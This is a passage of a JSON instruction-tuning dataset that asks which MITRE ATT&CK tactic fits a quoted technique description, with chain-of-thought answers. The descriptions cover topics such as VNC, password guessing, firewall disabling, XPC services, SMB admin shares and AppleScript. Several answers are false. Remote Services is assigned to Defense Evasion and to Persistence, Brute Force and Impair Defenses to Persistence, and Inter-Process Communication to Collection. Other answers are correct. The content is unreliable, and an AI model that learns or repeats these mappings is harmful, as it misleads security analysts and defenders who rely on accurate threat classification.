      "answer": "The given description is related to sub technique: Web Protocols (T1071.001);\nSub technique Web Protocols (T1071.001) is a type of technique Application Layer Protocol (T1071);\nTechnique Application Layer Protocol (T1071) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.  It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).  An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths.?",
    "context": "",
    "output": "The given description is related to sub technique: Rename System Utilities (T1036.003);\nSub technique Rename System Utilities (T1036.003) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.  It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).  An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths.",
      "answer": "The given description is related to sub technique: Rename System Utilities (T1036.003);\nSub technique Rename System Utilities (T1036.003) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use Valid Accounts to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.\n\nVNC differs from Remote Desktop Protocol as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.?",
    "context": "",
    "output": "The given description is related to sub technique: VNC (T1021.005);\nSub technique VNC (T1021.005) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use Valid Accounts to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.\n\nVNC differs from Remote Desktop Protocol as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.",
      "answer": "The given description is related to sub technique: VNC (T1021.005);\nSub technique VNC (T1021.005) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.?",
    "context": "",
    "output": "The given description is related to sub technique Password Guessing (T1110.001);\nSub technique Password Guessing (T1110.001) is a type of technique Brute Force (T1110);\nTechnique Brute Force (T1110) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
      "answer": "The given description is related to sub technique Password Guessing (T1110.001);\nSub technique Password Guessing (T1110.001) is a type of technique Brute Force (T1110);\nTechnique Brute Force (T1110) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.?",
    "context": "",
    "output": "The given description is related to sub technique: Standard Encoding (T1132.001);\nSub technique Standard Encoding (T1132.001) is a type of technique Data Encoding (T1132);\nTechnique Data Encoding (T1132) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME. Some data encoding systems may also result in data compression, such as gzip.",
      "answer": "The given description is related to sub technique: Standard Encoding (T1132.001);\nSub technique Standard Encoding (T1132.001) is a type of technique Data Encoding (T1132);\nTechnique Data Encoding (T1132) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. Non-Standard Port).\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various Remote Services may also indirectly modify firewall rules.",
    "context": "",
    "output": "The given description is related to sub technique Disable or Modify System Firewall (T1562.004);\nSub technique Disable or Modify System Firewall (T1562.004) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. Non-Standard Port).\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds. Settings related to enabling abuse of various Remote Services may also indirectly modify firewall rules.",
      "answer": "The given description is related to sub technique Disable or Modify System Firewall (T1562.004);\nSub technique Disable or Modify System Firewall (T1562.004) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.\n\nAdversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler. This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct Exploitation for Privilege Escalation.",
    "context": "",
    "output": "The given description is related to sub technique XPC Services (T1559.003);\nSub technique XPC Services (T1559.003) is a type of technique Inter-Process Communication (T1559);\nTechnique Inter-Process Communication (T1559) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.\n\nAdversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler. This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct Exploitation for Privilege Escalation.",
      "answer": "The given description is related to sub technique XPC Services (T1559.003);\nSub technique XPC Services (T1559.003) is a type of technique Inter-Process Communication (T1559);\nTechnique Inter-Process Communication (T1559) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. \n\nScripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or SSH.\n\nAdversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.?",
    "context": "",
    "output": "The given description is related to sub technique Network Device CLI (T1059.008);\nSub technique Network Device CLI (T1059.008) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. \n\nScripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or SSH.\n\nAdversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.",
      "answer": "The given description is related to sub technique Network Device CLI (T1059.008);\nSub technique Network Device CLI (T1059.008) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.?",
    "context": "",
    "output": "The given description is related to sub technique: Internet Connection Discovery (T1016.001);\nSub technique Internet Connection Discovery (T1016.001) is a type of technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
      "answer": "The given description is related to sub technique: Internet Connection Discovery (T1016.001);\nSub technique Internet Connection Discovery (T1016.001) is a type of technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target. This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS and NTP, though the use of several others in the wild have been documented.  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.?",
    "context": "",
    "output": "The given description is related to sub technique Reflection Amplification (T1498.002);\nSub technique Reflection Amplification (T1498.002) is a type of technique Network Denial of Service (T1498);\nTechnique Network Denial of Service (T1498) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target. This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.\n\nReflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS and NTP, though the use of several others in the wild have been documented.  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.",
      "answer": "The given description is related to sub technique Reflection Amplification (T1498.002);\nSub technique Reflection Amplification (T1498.002) is a type of technique Network Denial of Service (T1498);\nTechnique Network Denial of Service (T1498) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization\u2019s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise, Drive-by Compromise, or Trusted Relationship).",
    "context": "",
    "output": "The given description is related to sub technique: Business Relationships (T1591.002);\nSub technique Business Relationships (T1591.002) is a type of technique Gather Victim Org Information (T1591);\nTechnique Gather Victim Org Information (T1591) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization\u2019s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via Phishing for Information. Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Establish Accounts or Compromise Accounts), and/or initial access (ex: Supply Chain Compromise, Drive-by Compromise, or Trusted Relationship).",
      "answer": "The given description is related to sub technique: Business Relationships (T1591.002);\nSub technique Business Relationships (T1591.002) is a type of technique Gather Victim Org Information (T1591);\nTechnique Gather Victim Org Information (T1591) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.",
    "context": "",
    "output": "The given description is related to sub technique: SMB/Windows Admin Shares (T1021.002);\nSub technique SMB/Windows Admin Shares (T1021.002) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\n\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\n\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.",
      "answer": "The given description is related to sub technique: SMB/Windows Admin Shares (T1021.002);\nSub technique SMB/Windows Admin Shares (T1021.002) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\n\nScripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.\n\nAppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS Native APIs\u00a0<code>NSAppleScript</code>\u00a0or\u00a0<code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.\n\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute Native APIs, which otherwise would require compilation and execution in a mach-O binary file format. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via Python.",
    "context": "",
    "output": "The given description is related to sub technique: AppleScript (T1059.002);\nSub technique AppleScript (T1059.002) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\n\nScripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.\n\nAppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS Native APIs\u00a0<code>NSAppleScript</code>\u00a0or\u00a0<code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.\n\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute Native APIs, which otherwise would require compilation and execution in a mach-O binary file format. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via Python.",
      "answer": "The given description is related to sub technique: AppleScript (T1059.002);\nSub technique AppleScript (T1059.002) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",
    "context": "",
    "output": "The given description is related to sub technique Asymmetric Cryptography (T1573.002);\nSub technique Asymmetric Cryptography (T1573.002) is a type of technique Encrypted Channel (T1573);\nTechnique Encrypted Channel (T1573) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",
      "answer": "The given description is related to sub technique Asymmetric Cryptography (T1573.002);\nSub technique Asymmetric Cryptography (T1573.002) is a type of technique Encrypted Channel (T1573);\nTechnique Encrypted Channel (T1573) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
